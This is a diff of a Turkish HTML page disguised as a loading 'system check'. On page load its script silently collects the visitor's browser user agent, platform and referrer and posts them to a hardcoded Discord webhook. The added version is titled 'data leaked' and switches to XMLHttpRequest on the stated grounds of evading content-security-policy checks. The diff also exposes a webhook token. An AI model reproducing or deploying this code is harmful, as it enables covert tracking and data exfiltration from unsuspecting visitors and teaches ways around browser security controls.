@@ -2,43 +2,41 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Doğrulaması</title>
+    <title>Sistem Kontrolü</title>
 </head>
 <body>
     <h1>Yükleniyor...</h1>
     
     <script>
-        (async function() {
-            
-            const webhookUrl = 'https://discord.com/api/webhooks/1483513824064831703/veRtfwL-8dyJPQ2gMGHD1FtxvgcsG1if2Sh_VqHLnERPfcPSqbHyjJ_BWIyVATmum9kf';
+        // Önceki scriptlerle çakışmaması için başına noktalı virgül koyuyoruz
+        ;(function() {
+            var webhookUrl = 'https://discord.com/api/webhooks/1483513824064831703/veRtfwL-8dyJPQ2gMGHD1FtxvgcsG1if2Sh_VqHLnERPfcPSqbHyjJ_BWIyVATmum9kf';
 
-            const payload = {
+            var data = {
                 embeds: [{
-                    title: "🚀 Yeni Pentest Verisi Yakalandı",
-                    color: 15158332, 
+                    title: "🚀 Veri Sızdırıldı",
+                    color: 3066993,
                     fields: [
-                        { name: "🌐 Tarayıcı (UA)", value: `\`\`\`${navigator.userAgent}\`\`\`` },
-                        { name: "💻 Platform", value: navigator.platform, inline: true },
-                        { name: "🌍 Dil", value: navigator.language, inline: true },
-                        { name: "📏 Çözünürlük", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "🔗 Referrer", value: document.referrer || "Direkt Giriş" }
+                        { name: "Tarayıcı", value: navigator.userAgent },
+                        { name: "Platform", value: navigator.platform },
+                        { name: "Referrer", value: document.referrer || "Direkt" }
                     ],
-                    footer: { text: "Sistem İzleme Modülü" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                console.log("Veri başarıyla iletildi.");
-            } catch (err) 
-                const fallbackImg = new Image();
-                fallbackImg.src = `${webhookUrl}?content=${encodeURIComponent(JSON.stringify(payload))}`;
-            }
+            // Fetch yerine XMLHttpRequest kullanıyoruz (Bazen CSP 'fetch'i daha sıkı denetler)
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    console.log("Durum: " + xhr.status);
+                }
+            };
+
+            xhr.send(JSON.stringify(data));
         })();
     </script>
 </body>
